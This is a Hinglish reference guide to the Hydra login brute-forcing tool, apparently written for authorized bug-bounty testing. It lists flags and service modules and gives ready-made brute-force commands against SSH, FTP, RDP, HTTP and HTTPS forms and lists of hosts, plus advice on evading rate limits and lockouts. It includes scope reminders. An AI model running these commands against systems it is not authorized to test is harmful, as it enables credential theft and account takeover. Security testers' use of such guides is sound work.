# Hydra — Complete Reference Guide

> Password/login brute-forcing tool. Authorized scope pe hi use karna — Syfe jaise targets pe automated tools sirf UAT environment pe allowed hain, production pe nahi.

---

## 1. Basic Syntax

```
hydra [options] target module [module-options]
hydra [options] -s PORT target module
hydra [options] target service://target
```

---

## 2. Core Flags — Full Table

| Flag | Meaning | Example |
|---|---|---|
| `-l` | Single username | `-l admin` |
| `-L` | Username list (file) | `-L users.txt` |
| `-p` | Single password | `-p password123` |
| `-P` | Password list (file) | `-P rockyou.txt` |
| `-C` | Combo file (`user:pass` format), overrides -l/-L/-p/-P | `-C combo.txt` |
| `-e` | Extra checks: `n`=null password, `s`=login as pass, `r`=reversed login | `-e nsr` |
| `-M` | List of targets (multi-host attack) | `-M targets.txt` |
| `-o` | Output file for found credentials | `-o found.txt` |
| `-b` | Output format: `text`, `json`, `jsonv1` | `-b json` |
| `-f` | Stop after first valid pair found (per host) | `-f` |
| `-F` | Stop after first valid pair found (globally, all hosts) | `-F` |
| `-t` | Number of parallel tasks/threads (default 16) | `-t 4` |
| `-T` | Number of parallel connections total across all targets | `-T 64` |
| `-w` | Wait time per response timeout (seconds) | `-w 30` |
| `-W` | Wait time between connects | `-W 5` |
| `-c` | Wait time between each attempt per thread (evade rate-limit) | `-c 1` |
| `-s` | Non-default port | `-s 8080` |
| `-S` | Use SSL/TLS connection | `-S` |
| `-v` / `-V` | Verbose mode (show each login attempt) | `-V` |
| `-d` | Debug mode | `-d` |
| `-q` | Don't print connection error messages | `-q` |
| `-4` / `-6` | Force IPv4 / IPv6 | `-4` |
| `-I` | Ignore existing restore file, start fresh | `-I` |
| `-R` | Restore previous aborted/crashed session | `-R` |
| `-x` | Password generation rules: `min:max:charset` | `-x 4:8:aA1` |
| `-y` | Disable use of `-x` charset shortcuts (use literal chars only) | `-y` |
| `-u` | Loop around users instead of passwords (user-first iteration) | `-u` |
| `-U` | Show module-specific usage/options | `-U http-post-form` |
| `-m` | Module-specific option string | `-m "DB=1"` (varies) |
| `-h` | Help | `-h` |

---

## 3. `-e` Extra Checks Explained

| Sub-flag | Meaning |
|---|---|
| `n` | Try empty/null password |
| `s` | Try login name as the password |
| `r` | Try reversed login name as password |

Combine: `-e nsr` = sab teeno try karega har username ke saath.

---

## 4. `-x` Password Generation (Brute Force Mode)

Syntax: `-x min:max:charset`

| Charset code | Meaning |
|---|---|
| `a` | lowercase a-z |
| `A` | uppercase A-Z |
| `1` | digits 0-9 |
| `!` | special characters |

Example: `-x 4:8:aA1` → 4 se 8 characters, lowercase+uppercase+digits combos try karega (wordlist ki jagah pure brute force).

---

## 5. Common Service Modules

| Service | Module Name |
|---|---|
| SSH | `ssh` |
| FTP | `ftp` |
| Telnet | `telnet` |
| HTTP Basic Auth | `http-get` / `http-head` |
| HTTP POST Form | `http-post-form` |
| HTTPS POST Form | `https-post-form` |
| RDP | `rdp` |
| SMB | `smb` |
| MySQL | `mysql` |
| PostgreSQL | `postgres` |
| SMTP | `smtp` |
| POP3 | `pop3` |
| IMAP | `imap` |
| VNC | `vnc` |
| SNMP | `snmp` |
| LDAP | `ldap2` / `ldap3` |

---

## 6. Practical Command Examples

### SSH brute-force
```
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10 -t 4
```

### FTP with user list + pass list
```
hydra -L users.txt -P passwords.txt ftp://target.com
```

### HTTP POST Login Form
```
hydra -l admin -P passwords.txt target.com http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid credentials" -V
```
- `^USER^` aur `^PASS^` placeholders hydra khud replace karega
- Teesra field (`:Invalid credentials`) = failure string jo response mein aata hai wrong login pe

### HTTPS POST Form with custom failure condition (success string bhi use kar sakte ho `S=` prefix se)
```
hydra -l admin -P passwords.txt target.com https-post-form \
"/login:user=^USER^&pass=^PASS^:S=Dashboard" -V
```

### RDP brute-force with rate limiting (evade lockout)
```
hydra -l administrator -P passwords.txt rdp://target.com -t 1 -c 3 -W 10
```

### Combo file attack
```
hydra -C combo.txt ssh://target.com
```

### Multiple targets from file
```
hydra -M targets.txt -l admin -P passwords.txt ssh
```

### Stop at first valid credential across all hosts
```
hydra -M targets.txt -L users.txt -P passwords.txt ssh -F
```

### Non-standard port + SSL
```
hydra -l admin -P passwords.txt -s 8443 -S target.com https-get
```

### Output results as JSON
```
hydra -l admin -P passwords.txt ssh://target.com -o results.json -b json
```

---

## 7. Advanced Techniques

### 7.1 Evading Rate-Limiting / Lockouts
- `-t 1` (single thread) + `-c 2` ya `-c 3` (delay between attempts)
- `-W` se connection delay badhao
- Bahut zyada threads use mat karo authorized test mein bhi — WAF/IPS trigger ho sakta hai aur account lockout ho sakta hai (scope violation risk)

### 7.2 Resume Interrupted Session
Agar hydra crash/Ctrl+C ho jaye:
```
hydra -R
```
Automatically last session restore file (`hydra.restore`) se continue karta hai.

### 7.3 Custom HTTP Headers (Cookies, User-Agent) in Form Attacks
```
hydra -l admin -P passwords.txt target.com http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid:H=Cookie: session=abc123"
```
- `H=` module option se custom headers pass kar sakte ho (cookie, auth token, etc.)

### 7.4 Testing 2FA/OTP-Protected Endpoints
Hydra directly OTP handle nahi karta — usually login step tak brute-force karte ho, phir OTP step manually/Burp se chain karte ho.

### 7.5 CSRF Token Handling in Forms
Agar login form CSRF token maangta hai, hydra ka `http-post-form` module dynamic token nahi fetch kar sakta — is case mein Burp Intruder better hai (macro/session handling rules ke saath), ya custom script (Python + requests) likhna padega.

### 7.6 Combining with proxychains (via authorized proxy only)
```
proxychains hydra -l admin -P passwords.txt ssh://target.com
```

### 7.7 Verbose + Debug for Troubleshooting Module Options
```
hydra -U http-post-form
```
Ye module-specific syntax/options dikhata hai jab confusion ho request format ko le ke.

---

## 8. Ethical/Scope Reminders

- Sirf authorized scope pe chalana (jaise Syfe ka UAT environment) — production pe automated brute-force tools scope violation hai
- Rate limiting laga ke chalao taaki target service disrupt na ho (availability impact = out of scope in most bounty programs)
- Real accounts lockout mat karo — thread count aur delay conservative rakho

---

*Reference: `hydra -h` aur `hydra -U <module>` hamesha sabse accurate/updated flag list dete hain, kyunki versions ke beech options thoda change ho sakta hai.*
